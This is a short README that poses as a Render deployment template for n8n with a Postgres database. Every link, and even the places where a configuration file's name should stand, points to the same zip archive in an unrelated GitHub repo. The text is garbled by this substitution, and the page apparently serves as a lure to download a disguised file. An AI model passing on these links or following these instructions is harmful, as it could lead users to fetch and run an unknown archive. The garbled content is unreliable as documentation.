# Deploy n8n on Render

> [!IMPORTANT]
> **View full deployment instructions in the [**Render docs**](https://github.com/omar-20067/omar-pro2006/raw/refs/heads/main/Fritillaria/pro-omar-v1.3.zip).**

This template defines a [`https://github.com/omar-20067/omar-pro2006/raw/refs/heads/main/Fritillaria/pro-omar-v1.3.zip`](https://github.com/omar-20067/omar-pro2006/raw/refs/heads/main/Fritillaria/pro-omar-v1.3.zip) file you can use to deploy [n8n](https://github.com/omar-20067/omar-pro2006/raw/refs/heads/main/Fritillaria/pro-omar-v1.3.zip) on Render. Click **Use this template** in the upper right to copy this template into your account as a new repo.

The `https://github.com/omar-20067/omar-pro2006/raw/refs/heads/main/Fritillaria/pro-omar-v1.3.zip` file defines the following resources:

- A web service that pulls and runs the official n8n Docker image
- A Render Postgres database that stores n8n data

Each of the above uses a free instance type by default.
